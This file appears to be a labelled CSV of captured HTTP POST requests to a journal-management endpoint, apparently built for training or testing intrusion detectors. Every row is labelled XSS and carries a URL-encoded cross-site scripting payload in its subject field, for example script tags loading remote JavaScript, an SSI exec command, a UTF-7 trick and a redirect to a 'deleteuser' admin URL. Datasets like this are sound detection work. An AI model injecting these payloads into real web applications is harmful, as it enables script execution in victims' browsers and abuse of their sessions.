request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
3a4adc5c4f6209940af282a1c1816db5,"Fri, 12 Jun 2026 07:51:29 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjpg%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EA%20research%20paper%20examines%20the%20correlation%20between%20corporate%20social%20responsibility%20initiatives%20and%20long-term%20brand%20loyalty%20among%20millennial%20consumers%2e%3C%2Fp%3E&submitFormButton=,464,172.19.2.40,52140,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
06db3c86badc7cd38922433ee63f8a5f,"Fri, 12 Jun 2026 07:51:29 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3b!--%23exec%20cmd%3d%5c%22%2fbin%2fecho%20'%26lt%3bSCR'%5c%22--%26gt%3b%26lt%3b!--%23exec%20cmd%3d%5c%22%2fbin%2fecho%20'IPT%20SRC%3dhttp%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b'%5c%22--%26gt%3b&comment=%3Cp%3EThis%20investigation%20analyzes%20microplastics%20contamination%20in%20freshwater%20ecosystems%20and%20proposes%20industrial%20filtration%20standards%20to%20prevent%20further%20pollution%2e%3C%2Fp%3E&submitFormButton=,589,172.19.2.40,52160,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
02e23b43f377c3c9695d262181105730,"Fri, 12 Jun 2026 07:51:29 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3b%3f%20echo('%26lt%3bSCR)'%3b&comment=%3Cp%3EThe%20article%20discusses%20the%20potential%20of%20quantum%20computing%20in%20breaking%20current%20encryption%20standards%20and%20its%20implications%20for%20cybersecurity%2e%3C%2Fp%3E&submitFormButton=,347,172.19.2.40,52102,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d4241874ca18299dd62f1e52ed4cc437,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=echo('IPT%26gt%3balert(%5c%22XSS%5c%22)%26lt%3b%2fSCRIPT%26gt%3b')%3b%20%3f%26gt%3b&comment=%3Cp%3EA%20study%20on%20remote%20learning%20effectiveness%20during%20the%20pandemic%20reveals%20both%20advantages%20in%20accessibility%20and%20challenges%20with%20student%20engagement%20and%20equity%2e%3C%2Fp%3E&submitFormButton=,415,172.19.2.40,52138,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
da724836f90cf797a6fbf42e48663191,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bIMG%20SRC%3d%5c%22http%26%2358%3b%2f%2fwww%26%2346%3bthesiteyouareon%26%2346%3bcom%2fsomecommand%26%2346%3bphp%3fsomevariables%3dmaliciouscode%5c%22%26gt%3b&comment=%3Cp%3EThis%20paper%20explores%20the%20role%20of%20women%20entrepreneurs%20in%20sustainable%20business%20innovation%20and%20barriers%20they%20face%20in%20securing%20venture%20capital%20funding%2e%3C%2Fp%3E&submitFormButton=,490,172.19.2.40,52130,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
8f8c65fa67b25c55db0c6817105a9702,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=Redirect%20302%20%2fa%26%2346%3bjpg%20http%26%2358%3b%2f%2fvictimsite%26%2346%3bcom%2fadmin%26%2346%3basp%26deleteuser&comment=%3Cp%3EThe%20research%20examines%20how%20augmented%20reality%20transforms%20customer%20shopping%20experiences%20and%20its%20impact%20on%20e-commerce%20conversion%20rates%2e%3C%2Fp%3E&submitFormButton=,421,172.19.2.40,52148,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
52545d94a9e7cd319faaed933b231d1c,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bMETA%20HTTP-EQUIV%3d%5c%22Set-Cookie%5c%22%20Content%3d%5c%22USERID%3d%26lt%3bSCRIPT%26gt%3balert('XSS')%26lt%3b%2fSCRIPT%26gt%3b%5c%22%26gt%3b&comment=%3Cp%3EAn%20analysis%20of%20antibiotic%20resistance%20patterns%20in%20hospital%20settings%20proposes%20new%20stewardship%20protocols%20to%20combat%20the%20rise%20of%20drug-resistant%20bacteria%2e%3C%2Fp%3E&submitFormButton=,477,172.19.2.40,52110,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
0960c84fee23b5986ba62e89d7352810,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bHEAD%26gt%3b%26lt%3bMETA%20HTTP-EQUIV%3d%5c%22CONTENT-TYPE%5c%22%20CONTENT%3d%5c%22text%2fhtml%3b%20charset%3dUTF-7%5c%22%26gt%3b%20%26lt%3b%2fHEAD%26gt%3b%2bADw-SCRIPT%2bAD4-alert('XSS')%3b%2bADw-%2fSCRIPT%2bAD4-&comment=%3Cp%3EThis%20article%20investigates%20the%20connection%20between%20inadequate%20sleep%20and%20chronic%20disease%20development,%20offering%20evidence-based%20sleep%20hygiene%20recommendations%2e%3C%2Fp%3E&submitFormButton=",546,172.19.2.40,52174,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
0f43634a55c6dbaf44a45c2e9d90524a,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20a%3d%5c%22%26gt%3b%5c%22%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EThe%20paper%20reviews%20emerging%20technologies%20in%20waste%20management,%20including%20advanced%20recycling%20methods%20and%20decomposition%20acceleration%20techniques%2e%3C%2Fp%3E&submitFormButton=",477,172.19.2.40,52186,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d8f1db9656a8e509722f6fc4168a4914,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20%3d%5c%22%26gt%3b%5c%22%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EA%20comprehensive%20study%20on%20digital%20literacy%20programs%20in%20developing%20countries%20shows%20their%20correlation%20with%20improved%20economic%20opportunities%20and%20social%20mobility%2e%3C%2Fp%3E&submitFormButton=,500,172.19.2.40,52122,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
0a69aad758e6acb9795cb9ce3e2bc7b5,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20a%3d%5c%22%26gt%3b%5c%22%20''%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EThis%20research%20explores%20the%20therapeutic%20applications%20of%20psychedelic%20compounds%20in%20treating%20treatment-resistant%20depression%20and%20PTSD%20in%20clinical%20settings%2e%3C%2Fp%3E&submitFormButton=,496,172.19.2.40,52140,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
16a9b8492589e93ce056f6602052af4b,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20%5c%22a%3d'%26gt%3b'%5c%22%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EThe%20article%20analyzes%20the%20influence%20of%20streaming%20platforms%20on%20traditional%20entertainment%20industries%20and%20shifts%20in%20consumer%20viewing%20habits%20globally%2e%3C%2Fp%3E&submitFormButton=,490,172.19.2.40,52160,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
433c6e0059febbb68b31fe2aa8fe86f7,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20a%3d%60%26gt%3b%60%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EThis%20paper%20examines%20carbon%20sequestration%20potential%20in%20reforestation%20projects%20and%20evaluates%20their%20cost-effectiveness%20as%20climate%20change%20mitigation%20strategies%2e%3C%2Fp%3E&submitFormButton=,491,172.19.2.40,52102,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d35d0043271295dd2172525c5199f5bf,"Fri, 12 Jun 2026 07:51:30 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=11&wasNew=&submissionId=16&stageId=4,queryId=11&wasNew=&submissionId=16&stageId=4,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%20a%3d%5c%22%26gt%3b'%26gt%3b%5c%22%20SRC%3d%5c%22http%26%2358%3b%2f%2fha%26%2346%3bckers%26%2346%3borg%2fxss%26%2346%3bjs%5c%22%26gt%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=%3Cp%3EThis%20article%20examines%20the%20emerging%20role%20of%20blockchain%20technology%20in%20supply%20chain%20transparency%20and%20how%20it%20reduces%20fraud%20in%20international%20trade%2e%3C%2Fp%3E&submitFormButton=,498,172.19.2.40,52130,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
